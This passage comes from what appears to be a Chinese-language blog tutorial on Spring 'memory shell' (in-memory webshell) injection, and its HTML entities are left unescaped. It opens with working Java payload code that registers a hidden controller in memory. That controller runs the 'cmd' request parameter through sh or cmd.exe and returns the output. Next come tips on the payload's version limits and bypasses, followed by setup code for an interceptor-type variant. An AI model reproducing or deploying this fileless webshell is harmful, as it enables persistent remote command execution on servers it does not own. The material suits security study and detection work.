在内存中动态注册 controller        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);        r.registerMapping(info, new Controller_Shell(), method);    &#125;    public class Controller_Shell&#123;        public void shell(HttpServletRequest request, HttpServletResponse response) throws IOException &#123;            if (request.getParameter(&quot;cmd&quot;) != null) &#123;                boolean isLinux = true;                String osTyp = System.getProperty(&quot;os.name&quot;);                if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) &#123;                    isLinux = false;                &#125;                String[] cmds = isLinux ? new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, request.getParameter(&quot;cmd&quot;)&#125; : new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, request.getParameter(&quot;cmd&quot;)&#125;;                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();                Scanner s = new Scanner(in).useDelimiter(&quot;\\A&quot;);                String output = s.hasNext() ? s.next() : &quot;&quot;;                response.getWriter().write(output);                response.getWriter().flush();            &#125;        &#125;        &#125;    &#125;

踩坑警告我们的springmvc-servelet.xml文件中一定要手动开启注解驱动&lt;mvc:annotation-driven/&gt;：假如不加上的话，我们controller内存马注入时的第二步获取RequestMappingHandlerMapping会获取不了这个bean另外这个payload是有版本限制的，有关版本的绕过请使用另外2个payload，我们上述介绍了3种方式，我们只需使用第三种即可拉
Interceptor型内存马环境搭建这里还是用SpringBoot进行环境搭建（懒ORZ）首先准备一个自定义的Interceptor：
package com.example.springshell.interceptor;import jakarta.servlet.http.HttpServletRequest;import jakarta.servlet.http.HttpServletResponse;import org.springframework.web.servlet.HandlerInterceptor;import org.springframework.web.servlet.ModelAndView;public class testfilter implements HandlerInterceptor &#123;    @Override    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;        System.out.println(&quot;prehandle&quot;);        return true;    &#125;    @Override    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception &#123;        System.out.println(&quot;posthandle&quot;);    &#125;    @Override    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception &#123;        System.out.println(&quot;afterhandle&quot;);    &#125;&#125;
再创建一个config类，注册我们的拦截器：
package com.example.springshell.config;import com.example.springshell.interceptor.testfilter;import org.springframework.context.annotation.Configuration;import org.springframework.web.servlet.config.annotation.InterceptorRegistration;import org.springframework.web.servlet.config.annotation.InterceptorRegistry;import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;@Configurationpublic class WebAppConfigurer implements WebMvcConfigurer &#123;    @Override    public void addInterceptors(InterceptorRegistry registry) &#123;        InterceptorRegistration interceptorRegistration=registry.addInterceptor(new testfilter());        interceptorRegistration.addPathPatterns(&quot;/**&quot;);        interceptorRegistration.excludePathPatterns(&quot;/&quot;,&quot;/error&quot;,&quot;/static/**&quot;);    &#125;&#125;

